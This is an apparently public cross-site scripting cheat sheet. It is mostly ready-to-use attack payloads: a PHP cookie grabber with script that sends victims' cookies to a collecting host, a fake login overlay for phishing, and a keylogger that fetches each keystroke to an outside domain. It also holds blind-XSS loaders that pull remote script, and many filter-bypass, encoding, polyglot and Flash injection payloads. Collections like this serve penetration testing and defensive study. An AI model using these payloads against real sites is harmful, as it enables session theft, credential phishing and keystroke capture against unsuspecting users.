# Cross Site Scripting

Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

- [Exploit code or POC](#exploit-code-or-poc)
- [Identify an XSS endpoint](#identify-an-xss-endpoint)
- [XSS in HTML/Applications](#xss-in-htmlapplications)
- [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
- [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
- [Blind XSS](#blind-xss)
- [Polyglot XSS](#polyglot-xss)
- [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
- [CSP Bypass](#csp-bypass)
- [Common WAF Bypass](#common-waf-bypass)

## Exploit code or POC

Cookie grabber for XSS

```php
<?php
// How to use it
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
or
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>

// Write the cookie in a file
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);

?>
```

UI redressing (Sophisticated phishing)

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

Keylogger for XSS

```javascript
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```

More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)

## Identify an XSS endpoint

```javascript
<script>debugger;</script>
```

## XSS in HTML/Applications

XSS Basic

```javascript
Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>

Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
```

XSS for HTML5

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
```

XSS using script tag (external payload)

```javascript
<script src=14.rs>
you can also specify an arbitratry payload with 14.rs/#payload
e.g: 14.rs/#alert(document.domain)
```

XSS in Hidden input

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
Use CTRL+SHIFT+X to trigger the onclick event
```

DOM XSS

```javascript
#"><img src=/ onerror=alert(2)>
```

XSS in JS Context (payload without quote/double quote from [@brutelogic](https://twitter.com/brutelogic)

```javascript
-(confirm)(document.domain)//
; alert(1);//
```

XSS URL

```javascript
URL/<svg onload=alert(1)>
URL/<script>alert('XSS');//
URL/<input autofocus onfocus=alert(1)>
```

## XSS in wrappers javascript and data URI

XSS with javascript:

```javascript
javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the "javacript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

XSS with data:

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

XSS with vbscript: only IE

```javascript
vbscript:msgbox("XSS")
```

## XSS in files

** NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

XSS in XML

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

XSS in SVG

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

XSS in SVG (short)

```javascript
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

XSS in Markdown

```csharp
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

XSS in SWF flash application

```powershell
Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
```

more payloads in ./files

XSS in SWF flash application

```
flashmediaelement.swf?jsinitfunctio%gn=alert`1`
flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
plupload.flash.swf?%#target%g=alert&uid%g=XSS&
moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
video-js.swf?readyFunction=alert(1)
player.swf?playerready=alert(document.cookie)
player.swf?tracecall=alert(document.cookie)
banner.swf?clickTAG=javascript:alert(1);//
io.swf?yid=\"));}catch(e){alert(1);}//
video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
```

XSS in CSS

```html
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

## Blind XSS

### XSS Hunter

Available at [https://xsshunter.com/app](https://xsshunter.com/app)

> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.

```javascript
"><script src=//yoursubdomain.xss.ht></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursubdomain.xss.ht\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yoursubdomain.xss.ht");a.send();</script>

<script>$.getScript("//yoursubdomain.xss.ht")</script>
```

### Other tools for Blind XSS

- [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
- [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
- [BlueLotus_XSSReceiver - FiresunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
- [ezXSS - ssl](https://github.com/ssl/ezXSS)

### Blind XSS endpoint

- Contact forms
- Ticket support
- Referer Header
  - Custom Site Analytics
  - Administrative Panel logs

## Polyglot XSS

Polyglot XSS - 0xsobky

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Polyglot XSS - Ashar Javed

```javascript
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
```

Polyglot XSS - Mathias Karlsson

```javascript
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
```

Polyglot XSS - Rsnake

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
```

Polyglot XSS - Daniel Miessler

```javascript
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
```

Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
![https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg](https://pbs.twimg.com/media/DWiLk3UX4AE0jJs.jpg)

```javascript
-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
```

![https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large](https://pbs.twimg.com/media/DWfIizMVwAE2b0g.jpg:large)

```javascript
<svg%0Ao%00nload=%09((pro\u006dpt))()//
```

Polyglot XSS - from [@filedescriptor's Polyglot Challenge](http://polyglot.innerht.ml)

```javascript
# by crlf
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

# by europa
javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>

# by EdOverflow
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

# by h1/ragnar
javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
```

## Filter Bypass and exotic payloads

Bypass case sensitive

```javascript
<sCrIpt>alert(1)</ScRipt>
```

Bypass tag blacklist

```javascript
<script x>
<script x>alert('XSS')<script y>
```

Bypass word blacklist with code evaluation

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

Bypass with incomplete html tag - IE/Firefox/Chrome/Safari

```javascript
<img src='1' onerror='alert(0)' <
```

Bypass quotes for string

```javascript
String.fromCharCode(88,83,83)
```

Bypass quotes in script tag

```javascript
http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
```

Bypass quotes in mousedown event

```javascript
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>

You can bypass a single quote with &#39; in an on mousedown event handler
```

Bypass dot filter

```javascript
<script>window['alert'](document['domain'])</script>
```

Bypass parenthesis for string - Firefox/Opera

```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

Bypass onxxxx= blacklist

```javascript
<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>
```

Bypass onxxx= filter with a null byte/vertical tab - IE/Safari

```javascript
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />
```

Bypass onxxx= filter with a '/' - IE/Firefox/Chrome/Safari

```javascript
<img src='1' onerror/=alert(0) />
```

Bypass space filter with "/" - IE/Firefox/Chrome/Safari

```javascript
<img/src='1'/onerror=alert(0)>
```

Bypass space filter with 0x0c/^L

```javascript
<svgonload=alert(1)>


$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
```

Bypass email filter ([RFC compliant](http://sphinx.mythic-beasts.com/~pdw/cgi-bin/emailvalidate))

```javascript
"><svg/onload=confirm(1)>"@x.y
```

Bypass document blacklist

```javascript
<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
```

Bypass using javascript inside a string

```javascript
<script>
foo="text </script><script>alert(1)</script>";
</script>
```

Bypass using an alternate way to redirect

```javascript
location="http://google.com"
document.location = "http://google.com"
document.location.href="http://google.com"
window.location.assign("http://google.com")
window['location']['href']="http://google.com"
```

Bypass using an alternate way to execute an alert - [@brutelogic](https://twitter.com/brutelogic/status/965642032424407040)

```javascript
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)

[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
```

Bypass using an alternate way to execute an alert - [@quanyang](https://twitter.com/quanyang/status/1078536601184030721)
```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

Bypass using an alternate way to execute an alert - [@404death](https://twitter.com/404death/status/1011860096685502464)

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

Bypass using an alternate way to trigger an alert

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

Bypass ">" using nothing #trololo (you don't need to close your tags)

```javascript
<svg onload=alert(1)//
```

Bypass ';' using another character

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

Bypass using HTML encoding

```javascript
%26%2397;lert(1)
```

Bypass using [Katakana](https://github.com/aemkei/katakana.js)

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```

Bypass using ECMAScript6 variation:

```
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
```

Bypass using Octal encoding

```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

Bypass using Unicode

```javascript
Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
transformed into U+003C LESS­THAN SIGN (<)

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")

Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')

Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
transformed into U+003C LESS­THAN SIGN (<)

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")

Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')

E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
%EF%BC%9E becomes >
%EF%BC%9C becomes <
```

Bypass using Unicode converted to uppercase

```javascript
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k

<ſvg onload=... > become <SVG ONLOAD=...>
<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
```

Bypass using overlong UTF-8

```javascript
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
```

Bypass using UTF-7

```javascript
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
```

Bypass using UTF-16be

```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

Bypass using UTF-32

```js
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

Bypass using BOM - Byte Order Mark (The page must begin with the BOM character.)
BOM character allows you to override charset of the page

```js
BOM Character for UTF-16 Encoding:
Big Endian : 0xFE 0xFF
Little Endian : 0xFF 0xFE
XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

BOM Character for UTF-32 Encoding:
Big Endian : 0x00 0x00 0xFE 0xFF
Little Endian : 0xFF 0xFE 0x00 0x00
XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```


Bypass using weird encoding or native interpretation to hide the payload (alert())

```javascript
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```

Exotic payloads

```javascript
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
